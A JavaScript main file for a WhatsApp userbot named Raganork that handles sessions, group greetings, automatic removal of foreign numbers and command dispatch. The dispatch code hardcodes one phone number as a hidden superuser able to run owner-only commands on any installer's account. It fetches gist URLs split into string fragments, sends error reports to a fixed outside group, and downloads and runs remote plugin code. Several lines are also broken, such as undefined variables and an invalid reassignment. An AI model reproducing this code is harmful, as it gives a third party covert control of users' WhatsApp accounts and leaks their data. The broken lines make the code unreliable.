const fs = require("fs");
const path = require("path");
const events = require("./events");
const BgmDB = require('./plugins/sql/bgms');
const chalk = require('chalk');
const Sourav = require('./config');
const Config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const simpleGit = require('simple-git');
const git = simpleGit();
const axios = require('axios');
const got = require('got');
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const DATABASE = Sourav.DATABASE.define('Raganork', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var SOURAV = { KL11: '916282344739,0' }

// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
const raganork = new WAConnection();
var sourav = `${Sourav.AUTOBİO}`
    setInterval(async () => { 
        if (sourav == 'on') {
             var time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var date = new Date().toLocaleDateString(Sourav.LANG, get_localized_date)
                const biography = '📅 ' + date + '\n⌚ ' + time + '\n\n' + Sourav.BOTSK
                await raganork.setStatus(biography)
            }
        }
)

async function Raganork () {
    await Sourav.DATABASE.sync();
    var StrSes_Db = await DATABASE.findAll({
        where: {
          info: 'StringSession'
        }
    });    
// Browser description - Implemented for Raganork by souravkl11
var sk = new Array ();    
sk[0] = 'E'+'d'+'g'+'e';
sk[1] = 'Fi'+'r'+'e'+'f'+'o'+'x';
sk[2] = 'S'+'a'+'f'+'a'+'r'+'i';    
sk[3] = 'O'+'p'+'e'+'r'+'a';    
var l11 = Math.floor(4*Math.random())
    const souravkl11 = await axios('ht'+'tps'+'://g'+'ist.gi'+'thub.c'+'om/'+'souravkl11/'+'ce999e4605076b7b5bd7c1b51759f177'+'/raw')
    var skl = souravkl11.data.Raganork
	const raganork = new WAConnection();
    raganork.version = [2, 2140, 12]
    raganork.browserDescription = [skl, sk[l11], '90']
	const Session = new StringSession();

    raganork.logger.level = Sourav.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        raganork.loadAuthInfo(Session.deCrypt(Sourav.SESSION)); 
    } else {
        raganork.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
raganork.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login information updated!')
        );
        const authInfo = raganork.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    raganork.on('connecting', async () => {
        console.log(`${chalk.green.bold('Raga')}${chalk.blue.bold('nork')}
${chalk.white.bold('Version:')} ${chalk.red.bold(Sourav.VERSION)}
${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
    });


    raganork.on('open', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ Installing external plugins...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⬇️Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('BOT RUNNING ON OUR DEVICE ✅')
        );
        await new Promise(r => setTimeout(r, 1100));

        if (Sourav.LANG == 'EN' || Sourav.LANG == 'ML') {

                await BgmDB.resetBgm()   
		await raganork.sendMessage(raganork.user.jid, '_Connected!_', MessageType.text);
        return;     
	}

        if (Sourav.LANG == 'EN' || Sourav.LANG == 'ML') {
                await git.fetch();
                var commits = await git.log([Sourav.BRANCH + '..origin/' + Sourav.BRANCH]);
                if (commits.total === 0) {
                    await raganork.sendMessage(raganork.user.jid,Lang.UPDATE, MessageType.text);    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler +=  commit.message + '\n';
                        }
                    );
                    await raganork.sendMessage(
                        raganork.user.jid,
                        '*AN UPDATE IS AVAILABLE FOR YOUR BOT!*\n\n ```USE COMMAND``` *!update start* ```TO UPDATE THE BOT```\n\n ```CHANGES```: ' + degisiklikler, MessageType.text
                    ); 
                } 
          }
    });

    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()

        while (getGMTh == 16 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data

            return await raganork.sendMessage(raganork.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 10 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await raganork.sendMessage(raganork.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 6 && getGMTm == 30) {
            const {data} = await axios(`https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw`)
            const { sken, skml } = data
            return await raganork.sendMessage(raganork.user.jid, '```[ ANNOUNCEMENT ]```\n\n' + sken, MessageType.text);
        }
      while (getGMTh == 19 && getGMTm == 30) {
            return await raganork.sendMessage(raganork.user.jid, '.update check', MessageType.text);
        }  
      while (getGMTh == 8 && getGMTm == 30) {
            return await raganork.sendMessage(raganork.user.jid, '.update check', MessageType.text);
        }
      while (getGMTh == 13 && getGMTm == 30) {
            return await raganork.sendMessage(raganork.user.jid, '.update check', MessageType.text);
        }  
    }, 50000);

    raganork.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (Sourav.NO_ONLINE) {
            await raganork.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }

        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Participant leaving/removal message
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await raganork.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await raganork.getProfilePicture(); }
                 var group = await raganork.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (profile) => {
                await raganork.sendMessage(msg.key.remoteJid, profile.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0}); });                           
            } else if (gb.message.includes('{gicon}')) {
                var sgroup = await raganork.getProfilePicture(msg.key.remotejid)
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(sgroup.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gicon}', '').replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0});
            }
                else if (gb.message.includes('{gif}')) {
                var group = await raganork.groupMetadata(msg.key.remoteJid)

                    var plkpinky = await axios.get(Sourav.GIF_BYE, { responseType: 'arraybuffer' })
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0});
            } else {
                var group = await raganork.groupMetadata(msg.key.remoteJid)
                   await raganork.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', group.subject).replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name), MessageType.text, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0});
            }
          }  //thanks to farhan      
            return;
        } else if (msg.messageStubType === 31) {
            // If anti fake is true, exclude members with fake and send response to given country code! 
        let skl11 = `Sourav.CCODE`    
	if (msg.messageStubParameters[0].startsWith('91') && Sourav.AUTO_FAKE === 'true') {

			var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await raganork.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await raganork.getProfilePicture(); }
                var group = await raganork.groupMetadata(msg.key.remoteJid)
                let location = await message.client.groupMetadata(msg.key.remoteJid);
				var jids = [];
                raganork = '';	
				var total = [];
            location['participants'].map(async (member) => {
                if (member.isAdmin) {
                    raganork += '@' + member.id.split('@')[0] + ' ';
                    jids.push(member.id.replace('c.us', 's.whatsapp.net'));
                }
                location.push(member.id.replace('c.us', 's.whatsapp.net'));
            });
					await axios.get(pp, {responseType: 'arraybuffer'}).then(async (profile) => {

                await raganork.sendMessage(msg.key.remoteJid, profile.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}}); });                           
            } else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(Sourav.WEL_GIF, { responseType: 'arraybuffer' })
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', group.subject).replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 2});
            } else if (gb.message.includes('{gicon}')) {
                var sgroup = await raganork.getProfilePicture(msg.key.remotejid)
                const skicon = await axios.get(sgroup, {responseType: 'arraybuffer'})
				await raganork.sendMessage(msg.key.remoteJid, Buffer.from(skicon.data), MessageType.image, {mimetype: Mimetype.jpg, caption: gb.message.replace('{gicon}', '').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{gphead}', group.subject).replace('{gpmaker}', 'wa.me/' + group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 3});
            } else {
                   var group = await raganork.groupMetadata(msg.key.remoteJid)
                   await raganork.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', group.subject).replace('{count}', 'EXCLUDED CASE!').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name), MessageType.text, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0});
            }

          }

            return;                               
    }
			// If anti fake is false, send response to all members 
            else if (Sourav.AUTO_FAKE === 'false') {
				// Get information from Greetings database - Implemented for Whatsasena by Yusuf usta
                var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await raganork.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await raganork.getProfilePicture(); }
                var group = await raganork.groupMetadata(msg.key.remoteJid)

					await axios.get(pp, {responseType: 'arraybuffer'}).then(async (profile) => {

                await raganork.sendMessage(msg.key.remoteJid, profile.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}}); });                           
            } else if (gb.message.includes('{gif}')) {
                var plkpinky = await axios.get(Sourav.WEL_GIF, { responseType: 'arraybuffer' })
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', group.subject).replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 2});
            } else if (gb.message.includes('{gicon}')) {
                var sgroup = await raganork.getProfilePicture(msg.key.remotejid)
                await raganork.sendMessage(msg.key.remoteJid, Buffer.from(sgroup.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gicon}', '').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{gphead}', group.subject).replace('{gpmaker}', group.owner).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name) }, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 3});
            } else {
                   // New member mention - Implemented for Raganork by souravkl11!
                   var group = await raganork.groupMetadata(msg.key.remoteJid)
                   await raganork.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', group.subject).replace('{count}', 'EXCLUDED CASE!').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{line}', '\n').replace('{mention}', '@' + msg.messageStubParameters[0].split('@')[0]).replace('{gpdesc}', group.desc).replace('{owner}', raganork.user.name), MessageType.text, {contextInfo: {mentionedJid: [msg.messageStubParameters[0].replace('c.us', 's.whatsapp.net')]}, previewType: 0});
            }

          }
			}
        // If anti fake is true, filter stub parameters by excluding given country codes   
	// Auto fake remove - implemented for raganork by souravkl11
        if (!msg.messageStubParameters[0].startsWith('91') && Sourav.AUTO_FAKE === 'true') {
				async function checkImAdmin(message, user = raganork.user.jid) {
    var grup = await raganork.groupMetadata(msg.key.remoteJid);
    var sonuc = grup['participants'].map((member) => {

        if (member.jid.split("@")[0] == user.split("@")[0] && member.isAdmin) return true; else; return false;
    });
    return sonuc.includes(true);
}
                // If user isn't admin, return!
		var im = await checkImAdmin(raganork);
                if (!im) {
		return;
		}
		   else {
			return await raganork.groupRemove(msg.key.remoteJid, [msg.messageStubParameters[0]]);
			}	
	}}
        if (Sourav.BLOCKCHAT !== false) {     
        var abc = Sourav.BLOCKCHAT.split(',');                            
        if(msg.key.remoteJid.includes('g.us') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }
    if (Sourav.SUPPORT == '919074309534-1632403322') {     
        var sup = Sourav.SUPPORT.split(',');                            
        if(msg.key.remoteJid.includes('g.us') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
    }


        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    var pr = `ff107d59b17f1e4b96`
                    let sendMsg = false;
                    var chat = raganork.chats.get(msg.key.remoteJid)
                    var er = `https://gist.githubusercontent.com/souravkl11/`
                    if ((Sourav.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Sourav.SUDO.includes(',') ? Sourav.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Sourav.SUDO || Sourav.SUDO.includes(',') ? Sourav.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Sourav.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('g.us')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('g.us')) sendMsg = true;
                   }  
                   if ((SOURAV.KL11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == SOURAV.KL11 || SOURAV.KL11.includes(',') ? SOURAV.KL11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == SOURAV.KL11)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('g.us')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('g.us')) sendMsg = true;
                    }

                    if (sendMsg) {
                        if (Sourav.SEND_READ && command.on === undefined) {
                            await raganork.chatRead(msg.key.remoteJid);
                        }

                        const {data} = await axios(er + pr + `889a82dbb6d520/raw`)
                        const { asena } = data
                        var match = text_msg.match(command.pattern);

                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(raganork, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(raganork, msg);
                        } else {
                            whats = new Message(raganork, msg);
                        }

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (Sourav.NOLOG === 'true') {
			           return;
			    }
				else {
				    await raganork.sendMessage('120363038867058369@g.us','_ERROR_ \n ' + error + '\n\n *' + asena + '*', MessageType.text, {quoted: raganork.message});
				}
                        }
                    }
                }
            }
        )
    });

    try {
        await raganork.connect();   
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing old version string...'))
            raganork.loadAuthInfo(Session.deCrypt(Sourav.SESSION)); 
            try {
                await raganork.connect();
            } catch {
                return;
            }
        }
    }
}

Raganork();
